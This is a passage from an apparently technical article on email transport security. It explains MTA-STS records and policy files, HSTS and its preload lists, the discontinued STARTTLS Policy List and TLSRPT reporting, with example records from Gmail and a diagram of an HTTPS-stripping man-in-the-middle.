especially given that most <abbr title="Domain Name System">DNS</abbr> records aren’t authenticated at all otherwise.</p>

</details>

<details>
  <summary id="mta-sts-dns-record">
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> <abbr title="Domain Name System">DNS</abbr> record
</summary>

  <p>When delivering an email, an outgoing mail server which supports <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> checks
whether it has a non-expired policy for the domain after the <code>@</code> symbol in the recipient’s email address.
If this is not the case, it queries for a <code>TXT</code> record at the <code>_mta-sts</code> subdomain of this domain.
An <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> record is a semicolon-separated list of key-value pairs <a href="#character-encoding">encoded in <abbr title="American Standard Code for Information Interchange">ASCII</abbr></a>,
where the keys and values are separated by an equals sign.
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> records have <a href="https://datatracker.ietf.org/doc/html/rfc8461#section-3.1">two required fields</a>:</p>
  <ul>
    <li><code>v</code>: The version of the <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> standard.
This field has to come first, and the only supported value is <code>STSv1</code> at the moment.</li>
    <li><code>id</code>: A unique identifier for the domain’s current <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy.
It consists of at least 1 and at most 32 letters and digits.</li>
  </ul>

  <p>At most one <code>TXT</code> record may be returned per version.
Indirections with <code>CNAME</code> records are allowed.
If a valid <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> record exists but the <a href="#mta-sts-policy-file">policy file</a> cannot be loaded,
the outgoing mail server has to deliver the message as if the recipient’s domain has not implemented <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>,
unless the outgoing mail server still has a valid policy in its cache,
in which case it has to apply this policy.
If you configure <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> for your domain, you should always update the policy file before updating the <code>TXT</code> record
so that senders don’t cache the old policy by mistake.
If you cannot use the <a href="#tool-lookup-mta-sts-policy">above tool</a>,
here is an example record:</p>

  <figure>

    <div><div><pre><code>v=STSv1; id=20190429T010101;
</code></pre></div>    </div>

    <figcaption>

The <code>TXT</code> record at <code>_mta-sts.gmail.com</code> in April 2021.

</figcaption>
  </figure>

</details>

<details>
  <summary id="mta-sts-policy-file">
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy file
</summary>

  <p>If the <a href="#mta-sts-dns-record"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> record</a> contains an unknown <code>id</code> value for the given domain,
the outgoing mail server retrieves the new <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy from <code>https://mta-sts.{Domain}/.well-known/mta-sts.txt</code>,
where <code>Domain</code> is the domain after the <code>@</code> symbol in the recipient’s email address.
The <code>Domain</code> is taken as is for both the <abbr title="Domain Name System">DNS</abbr> and the <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> lookup
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-3.4">without proceeding with the parent domain</a>
if the queried resource is not found.
As specified in <a href="https://datatracker.ietf.org/doc/html/rfc8615"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8615</a>,
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a>
maintains a <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">registry</a>
for the <code>.well-known</code> directory in order to prevent name collisions among unrelated standards.
A subdomain is used to allow <code>CNAME</code> indirections.
Moreover, the required <abbr title="Domain Name System">DNS</abbr> record prevents sites which allow untrusted users to claim subdomains from falling victim
to <a href="https://datatracker.ietf.org/doc/html/rfc8461#section-10.3">denial-of-service attacks</a> with malicious policies.
Examples are <a href="https://mta-sts.github.io/">https://mta-sts.github.io</a>
and <a href="https://mta-sts.blogspot.com/">https://mta-sts.blogspot.com</a>.</p>

  <p>The policy file is fetched with a <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods"><code>GET</code> request</a>.
The response must have a <a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">status code</a> of 200
and a <a href="#content-type">content type</a> of <code>text/plain</code>.
The content is parsed as <abbr title="American Standard Code for Information Interchange">ASCII</abbr>,
which means that <a href="#internationalized-domain-names">internationalized domain names</a>
have to be <a href="#punycode-encoding">Punycode-encoded</a>.
An <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy is specified with one key-value pair per line,
where the keys and values are separated by a colon
and the lines are separated by <a href="#newline-characters"><code>{CR}{LF}</code></a>
or <a href="https://datatracker.ietf.org/doc/html/rfc8461#page-9">just <code>{LF}</code></a>.
Each policy has to contain the <a href="https://datatracker.ietf.org/doc/html/rfc8461#section-3.2">following four fields</a>,
which may appear in any order:</p>
  <ul>
    <li><code>version</code>: The version of the <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> standard.
Its value has to be <code>STSv1</code>.</li>
    <li><code>mode</code>: What the <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a> client shall do
if it cannot authenticate the <a href="#incoming-mail-server">incoming mail server</a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc8461#section-5">possible values</a> are:
      <ul>
        <li><code>enforce</code>: The client must abort the connection if it cannot negotiate <abbr title="Transport Layer Security">TLS</abbr> with a valid server certificate.
It continues with the next server which matches one of the <code>mx</code> keys
and delays the delivery of the message when all of them fail validation.
Before failing permanently, the client has to check via <abbr title="Domain Name System">DNS</abbr> and then <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-5">for an updated policy</a>.</li>
        <li><code>testing</code>: <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> validation failures don’t affect the delivery of messages, but they should be reported
if both the sender and the recipient support <a href="#smtp-tls-reporting-tlsrpt"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> <abbr title="Transport Layer Security">TLS</abbr> Reporting (<abbr title="SMTP TLS Reporting">TLSRPT</abbr>)</a>.</li>
        <li><code>none</code>: The receiving domain doesn’t have an <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy.
In order to detect <a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attacks</a>,
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> clients should refresh cached policies when they are still valid.
If clients cannot refresh a policy while the previous policy is still valid,
they should alert the administrator unless the mode of the cached policy is <code>none</code>.
For this reason, you should publish an <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy with a mode of <code>none</code> until all previous policies have expired
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-8.3">before removing <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> on a domain</a>.</li>
      </ul>
    </li>
    <li><code>max_age</code>: For how many seconds this policy can be cached.
In order to give attackers fewer opportunities for downgrade attacks,
this value should be <a href="https://datatracker.ietf.org/doc/html/rfc8461#section-10.2">as high as is practical</a>.
The maximum value is 31’557’600, which corresponds to <a href="https://en.wikipedia.org/wiki/Tropical_year">365.25 days</a>.</li>
    <li><code>mx</code>: This field authenticates the incoming mail servers of the receiving domain.
Unlike the <code>MX</code> records of the domain, which are not authenticated when <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> isn’t used,
the policy is fetched via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> from a server with a valid <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificate.
This field may occur more than once and is required only if the mode isn’t <code>none</code>.
Since this field authenticates the <code>MX</code> records without replacing them, the value doesn’t have to resolve and
the <a href="https://en.wikipedia.org/wiki/Wildcard_character">wildcard character</a> <code>*</code> can be used as the leftmost label.</li>
  </ul>

  <p>When an <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> client connects to an <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> server with a valid policy,
it must use the <a href="https://en.wikipedia.org/wiki/Server_Name_Indication">Server Name Indication (SNI)</a>
<abbr title="Transport Layer Security">TLS</abbr> extension with the name of the server as encountered in the verified <code>MX</code> record.
Before we move on, here is an example policy:</p>

  <figure>

    <div><div><pre><code>version: STSv1
mode: enforce
mx: gmail-smtp-in.l.google.com
mx: *.gmail-smtp-in.l.google.com
max_age: 86400
</code></pre></div>    </div>

    <figcaption>

The policy file at
<a href="https://mta-sts.gmail.com/.well-known/mta-sts.txt"><code>https://mta-sts.gmail.com/.well-known/mta-sts.txt</code></a> in April 2021.

</figcaption>
  </figure>

</details>

<details>
  <summary id="http-strict-transport-security">
<abbr title="HyperText Transfer Protocol">HTTP</abbr> Strict Transport Security (<abbr title="HTTP Strict Transport Security">HSTS</abbr>)
</summary>

  <p><a href="#transport-security">Opportunistic use of <abbr title="Transport Layer Security">TLS</abbr></a> is not unique to email.
When a user enters a domain name into the <a href="https://en.wikipedia.org/wiki/Address_bar">address bar</a>
of their <a href="https://en.wikipedia.org/wiki/Web_browser">Web browser</a>,
the browser fetches the corresponding page via <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr></a>.
Websites which support <a href="https://en.wikipedia.org/wiki/HTTPS"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a>,
which is <abbr title="HyperText Transfer Protocol">HTTP</abbr> with <a href="#use-of-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a> on port 443 instead of 80,
usually <a href="https://en.wikipedia.org/wiki/URL_redirection">redirect the browser</a> to their secured version.
An active attacker, however, can just strip the <code>Location</code> header field from the reply
and deliver the rewritten content to the browser instead:</p>

  <figure>
    <svg id="figure-transport-security-http" data-name="transport-security-http" width="689.242" height="733.25" viewBox="-44.621 -1.25 689.242 733.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-43.371" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="730.75"></line>
    </g>
    <g>
        <rect x="256.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="300" y="25.65"><tspan>Attacker</tspan></tspan>
        </text>
        <line x1="300" y1="40.75" x2="300" y2="730.75"></line>
    </g>
    <g>
        <rect x="556.629" y="0" width="86.741" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="600" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="600" y1="40.75" x2="600" y2="730.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="298.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="149.375" y="69.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="145.5" x2="298.75" y2="145.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="149.375" y="111.5">GET / <tspan>http</tspan>/1.0</tspan><tspan x="149.375" y="133.5">Host: www.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="187.5" x2="598.75" y2="187.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="449.375" y="175.5">(Open <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="251.5" x2="598.75" y2="251.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="449.375" y="217.5">GET / <tspan>http</tspan>/1.0</tspan><tspan x="449.375" y="239.5">Host: www.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="600" y1="315.5" x2="301.25" y2="315.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="450.625" y="281.5"><tspan>http</tspan>/1.0 301 Moved Permanently</tspan><tspan x="450.625" y="303.5">Location: https://www.example.com/</tspan>
        </text>
    </g>
    <g>
        <line x1="600" y1="357.5" x2="301.25" y2="357.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="450.625" y="345.5">(Close <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="441.5" x2="598.75" y2="441.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="449.375" y="429.5">(Open <tspan>tls</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="505.5" x2="598.75" y2="505.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="449.375" y="471.5">GET / <tspan>http</tspan>/1.0</tspan><tspan x="449.375" y="493.5">Host: www.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="600" y1="569.5" x2="301.25" y2="569.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="450.625" y="535.5"><tspan>http</tspan>/1.0 200 <tspan>ok</tspan></tspan><tspan x="450.625" y="557.5">[Headers and body]</tspan>
        </text>
    </g>
    <g>
        <line x1="600" y1="611.5" x2="301.25" y2="611.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="450.625" y="599.5">(Close <tspan>tls</tspan> connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="675.5" x2="1.25" y2="675.5" marker-start="url(#circle-red)" marker-end="url(#arrow-red)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="150.625" y="641.5"><tspan>http</tspan>/1.0 200 <tspan>ok</tspan></tspan><tspan x="150.625" y="663.5">[Rewritten headers and body]</tspan>
        </text>
    </g>
    <g>
        <line x1="300" y1="717.5" x2="1.25" y2="717.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="292"></line>
        <text text-anchor="middle">
            <tspan x="150.625" y="705.5">(Close <tspan>tcp</tspan> connection)</tspan>
        </text>
    </g>

</svg>

    <figcaption>

How a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man in the middle</a>
can prevent the client from upgrading its <abbr title="Transmission Control Protocol">TCP</abbr> connection to <abbr title="Transport Layer Security">TLS</abbr>.
If the attacker knows that the server redirects <code>http://www.example.com/</code> to <code>https://www.example.com/</code>,
it can skip the first connection to the server, of course.

</figcaption>
  </figure>

  <p>Whether to use <a href="https://evalapply.org/internet/#transport-layer-security">Transport Layer Security (<abbr title="Transport Layer Security">TLS</abbr>)</a>
is encoded in the <a href="https://en.wikipedia.org/wiki/URL">Uniform Resource Locator (<abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr>)</a>.
For example, if the user enters <code>https://www.example.com/</code>,
the browser won’t fall back to the insecure version at <code>http://www.example.com/</code>.
On the other hand, if a browser tries to fetch <code>https://www.example.com/</code> when the user enters <code>www.example.com</code>
and falls back to <code>http://www.example.com/</code> only if the attempt fails,
the attacker can simply drop the browser’s <abbr title="Transport Layer Security">TLS</abbr> connection as <a href="#figure-transport-security-timeout">discussed above</a>.
This is different from email, where we don’t have a mechanism
<a href="https://datatracker.ietf.org/doc/html/rfc7672#section-1.3.1">to signal transport security policy in the address</a>.</p>

  <p>The problem of <a href="https://en.wikipedia.org/wiki/Opportunistic_encryption">opportunistic security</a> is addressed
by <a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"><abbr title="HyperText Transfer Protocol">HTTP</abbr> Strict Transport Security (<abbr title="HTTP Strict Transport Security">HSTS</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc6797"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6797</a>.
<abbr title="HTTP Strict Transport Security">HSTS</abbr> allows <a href="https://en.wikipedia.org/wiki/Web_server">Web servers</a> to indicate
with the <a href="https://datatracker.ietf.org/doc/html/rfc6797#section-6.1"><code>Strict-Transport-Security</code> <abbr title="HyperText Transfer Protocol">HTTP</abbr> response header field</a>
that they should be accessed only with <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>.
This header field has a required <a href="https://datatracker.ietf.org/doc/html/rfc6797#section-6.1.1"><code>max-age</code> directive</a>,
which specifies the number of seconds for which the <abbr title="HTTP Strict Transport Security">HSTS</abbr> policy should be cached,
and an optional <a href="https://datatracker.ietf.org/doc/html/rfc6797#section-6.1.2"><code>includeSubDomains</code> directive</a>,
which signals that the <abbr title="HTTP Strict Transport Security">HSTS</abbr> policy should be applied to subdomains of the current domain as well.
A <code>max-age</code> value of zero indicates that the current domain opts out <abbr title="HTTP Strict Transport Security">HSTS</abbr>.
The <code>Strict-Transport-Security</code> response header field is ignored in insecure <abbr title="HyperText Transfer Protocol">HTTP</abbr> responses.
Here is an example:</p>

  <figure>

    <div><div><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains
</code></pre></div>    </div>

    <figcaption>

A <code>Strict-Transport-Security</code> response header field with a validity period of 365 days.

</figcaption>
  </figure>

  <p>The problem with <abbr title="HTTP Strict Transport Security">HSTS</abbr> is that it doesn’t protect the first connection to the server:
An active attacker can prevent the browser from learning the server’s <abbr title="HTTP Strict Transport Security">HSTS</abbr> policy.
For this reason, browsers are delivered with an <a href="https://datatracker.ietf.org/doc/html/rfc6797#section-12.3"><abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list</a>.
All domains on this list are accessed only via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>.
<a href="https://source.chromium.org/chromium/chromium/src/+/master:net/http/transport_security_state_static.json">Chromium’s <abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list</a> is 15 MB in size.
All other browsers, for which we know how they source their <abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list, rely on Chromium’s <abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list.
You can submit your domain <a href="https://www.chromium.org/hsts">for inclusion in this list</a>
at <a href="https://hstspreload.org/">hstspreload.org</a>.
Since it takes months to get a domain <a href="https://hstspreload.org/#removal">off this list again</a>,
the willingness to be included in this list has to be confirmed with a <code>preload</code> directive
in the <code>Strict-Transport-Security</code> response header field.
As far as I can tell, this directive has not been standardized in any <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr>.
The only reason why we need <abbr title="HTTP Strict Transport Security">HSTS</abbr> is <a href="https://en.wikipedia.org/wiki/Backward_compatibility">backward compatibility</a>.
If you own a <a href="https://en.wikipedia.org/wiki/Generic_top-level_domain">generic top-level domain</a>,
you can <a href="https://hstspreload.org/#tld">submit the whole top-level domain</a> for inclusion in Chromium’s <abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list.
Since <a href="https://github.com/isaacs/github/issues/1249">GitHub Pages still doesn’t support <abbr title="HTTP Strict Transport Security">HSTS</abbr> for custom domains</a>,
this blog has no <code>Strict-Transport-Security</code> header field and is on no preload list.</p>

  <p>The following three security and privacy aspects of <abbr title="HTTP Strict Transport Security">HSTS</abbr> are worth mentioning:</p>
  <ul>
    <li><a href="#homograph-attack"><strong>Homograph attacks</strong></a>:
Just like all domain-based approaches, <abbr title="HTTP Strict Transport Security">HSTS</abbr> does not prevent homograph attacks.
If a user enters a wrong address or <a href="#phishing">visits a fraudulent link</a>,
an attacker can serve malicious content via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> with a valid certificate for the fake domain
or serve the content via <abbr title="HyperText Transfer Protocol">HTTP</abbr> given that the fake domain never used <abbr title="HTTP Strict Transport Security">HSTS</abbr>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6797#section-14.7"><strong>Network time attacks</strong></a>:
Unless a website is on the browser’s <abbr title="HTTP Strict Transport Security">HSTS</abbr> preload list, its <abbr title="HTTP Strict Transport Security">HSTS</abbr> policy expires at some point.
If an attacker can shift the time of the victim’s computer into the future
by attacking the <a href="https://en.wikipedia.org/wiki/Network_Time_Protocol">Network Time Protocol (<abbr title="Network Time Protocol">NTP</abbr>)</a>,
they can circumvent cached <abbr title="HTTP Strict Transport Security">HSTS</abbr> policies.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6797#section-14.9"><strong>Web tracking</strong></a>:
Whether a domain uses <abbr title="HTTP Strict Transport Security">HSTS</abbr> is a piece of information which the browser stores
and transmits to the server by accessing it via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> instead of <abbr title="HyperText Transfer Protocol">HTTP</abbr>.
By using many domains and enabling <abbr title="HTTP Strict Transport Security">HSTS</abbr> for a subset of them which is unique to each user,
users can be tracked across websites even when
<a href="https://en.wikipedia.org/wiki/HTTP_cookie">cookies</a> are disabled and
<a href="https://en.wikipedia.org/wiki/Private_browsing">private browsing</a> is enabled.</li>
  </ul>

</details>

<details>
  <summary id="starttls-policy-list">
<abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> Policy List
</summary>

  <p>Besides relying on <a href="#mail-transfer-agent-strict-transport-security">earlier connections</a>
or an <a href="#dns-based-authentication-of-named-entities">authenticated channel</a>,
<a href="#transport-security">transport security</a> can also be <a href="#requiretls-extension">required by the user</a>
or be <a href="https://datatracker.ietf.org/doc/html/rfc7672#section-1.3.3">configured by the administrator</a>.
An administrator can configure an outgoing mail server to require <abbr title="Transport Layer Security">TLS</abbr> for specific recipient domains.
In order to decrease the effort for administrators of outgoing mail servers,
the <a href="https://en.wikipedia.org/wiki/Electronic_Frontier_Foundation">Electronic Frontier Foundation (<abbr title="Electronic Frontier Foundation">EFF</abbr>)</a>
published the <a href="https://starttls-everywhere.org/policy-list/"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> Policy List</a> from
<a href="https://www.eff.org/deeplinks/2020/04/winding-down-starttls-everywhere-project-and-future-secure-email">2014 to 2020</a>.
While I understand that maintaining such a project is a lot of work,
the <abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr> Policy List could still serve as an <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> preload list
similar to <a href="#http-strict-transport-security"><abbr title="HTTP Strict Transport Security">HSTS</abbr> preload lists</a>
in order to prevent downgrade attacks on connections where the client has no cached <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy.
Since its discontinuation, no such policy list exists.</p>

</details>

<h4 id="smtp-tls-reporting-tlsrpt"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> <abbr title="Transport Layer Security">TLS</abbr> Reporting (<abbr title="SMTP TLS Reporting">TLSRPT</abbr>)</h4>

<p><a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol#SMTP_TLS_Reporting"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> <abbr title="Transport Layer Security">TLS</abbr> Reporting (<abbr title="SMTP TLS Reporting">TLSRPT</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8460"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8460</a>.
With it, domain owners can ask sending mail servers to report transport security failures to them,
which allows them to detect <a href="#tlsrpt-report-conditions">misconfigurations and attacks</a>.
If you’re certain that all emails are still being delivered to you,
you’re much more likely to <a href="#mta-sts-policy-file">enforce strict transport security</a>.
Just like <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reporting</a>,
<abbr title="SMTP TLS Reporting">TLSRPT</abbr> uses a <a href="#tlsrpt-dns-record"><abbr title="Domain Name System">DNS</abbr> record</a> to specify the endpoints
to which <a href="#tlsrpt-report-conditions">reports</a> should be sent
<a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.1">once a day</a>.</p>

<p>The following tool queries the <abbr title="SMTP TLS Reporting">TLSRPT</abbr> record with
<a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
and checks its format with a <a href="https://en.wikipedia.org/wiki/Regular_expression">regular expression</a>:</p>



<details>
  <summary id="tlsrpt-dns-record">
<abbr title="SMTP TLS Reporting">TLSRPT</abbr> <abbr title="Domain Name System">DNS</abbr> record
</summary>

  <p>The endpoints for the <a href="#tlsrpt-report-format">report</a> are specified in a <code>TXT</code> record at <code>_smtp._tls.{RecipientDomain}</code>.
The record has <a href="https://datatracker.ietf.org/doc/html/rfc8460#section-3">two fields</a>:</p>
  <ul>
    <li><code>v</code>: The version of the <abbr title="SMTP TLS Reporting">TLSRPT</abbr> standard.
This field has to come first, and the only supported value is <code>TLSRPTv1</code> at the moment.</li>
    <li><code>rua</code>: A comma-separated list of
<a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier">Uniform Resource Identifiers (<abbr title="Uniform Resource Identifiers (a format for unique resource names)">URIs</abbr>)</a> as endpoints.
The following two <a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax">schemes</a> are supported:
      <ul>
        <li><code>mailto</code>: The report is sent to the specified email address.
The email must have a valid <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a>,
and the service type of the <abbr title="DomainKeys Identified Mail">DKIM</abbr> key should include <abbr title="SMTP TLS Reporting">TLSRPT</abbr>.
Any <abbr title="Transport Layer Security">TLS</abbr>-related failures must be ignored when delivering the report.
<a href="#report-approval">Unlike <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr></a>, recipients with a different domain don’t have to approve <abbr title="SMTP TLS Reporting">TLSRPT</abbr> reports
since <a href="https://datatracker.ietf.org/doc/html/rfc8460#page-27">spam is less likely</a>.</li>
        <li><code>https</code>: The report is submitted via a <a href="https://en.wikipedia.org/wiki/POST_(HTTP)"><code>POST</code> request</a>
to the specified Web address.
Certificate validation errors may be ignored when submitting the report.
Since the submitter is not authenticated, I advise you not to use this method.
I have no idea why this shortcoming isn’t mentioned in the
<a href="https://datatracker.ietf.org/doc/html/rfc8460#section-7">security considerations</a>.</li>
      </ul>
    </li>
  </ul>

  <p>The fields are separated by a semicolon, and the keys and values are separated by an equals sign.
Here is an example record:</p>

  <figure>

    <div><div><pre><code>v=TLSRPTv1;rua=mailto:sts-reports@google.com
</code></pre></div>    </div>

    <figcaption>

The <code>TXT</code> record at <code>_smtp._tls.gmail.com</code>.
<a href="https://en.wikipedia.org/wiki/Whitespace_character">Whitespace</a> is allowed before and after semicolons.

</figcaption>
  </figure>

</details>

<details>
  <summary id="tlsrpt-report-format">
<abbr title="SMTP TLS Reporting">TLSRPT</abbr> report format
</summary>

  <p><abbr title="SMTP TLS Reporting">TLSRPT</abbr> reports are formatted with the <a href="https://en.wikipedia.org/wiki/JSON">JavaScript Object Notation (<abbr title="JavaScript Object Notation">JSON</abbr>)</a>
according to <a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.4">this schema</a>.
The reports should be compressed with <a href="https://en.wikipedia.org/wiki/Gzip">GZIP</a>
both when sent as an attachment via email and when submitted via <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc8460#section-5.1">filename of the report</a>
should be <code>{SenderDomain}!{RecipientDomain}!{BeginTime}!{EndTime}[!{UniqueId}].json[.gz]</code>
and the <a href="https://datatracker.ietf.org/doc/html/rfc8460#page-18">subject of the email</a>
<code>Report Domain: {RecipientDomain} Submitter: {SenderDomain} Report-ID: {ReportId}</code>,
with all dates in <a href="#unix-time">Unix time</a>.
In case of failures, the report <a href="https://datatracker.ietf.org/doc/html/rfc8460#section-4.3">indicates the cause</a>.
Here is an example report, which I’ve formatted for better readability:</p>

  <figure>

    <div><div><pre><code><span>{</span><span>
  </span><span>&#34;organization-name&#34;</span><span>:</span><span> </span><span>&#34;Google Inc.&#34;</span><span>,</span><span>
  </span><span>&#34;date-range&#34;</span><span>:</span><span> </span><span>{</span><span>
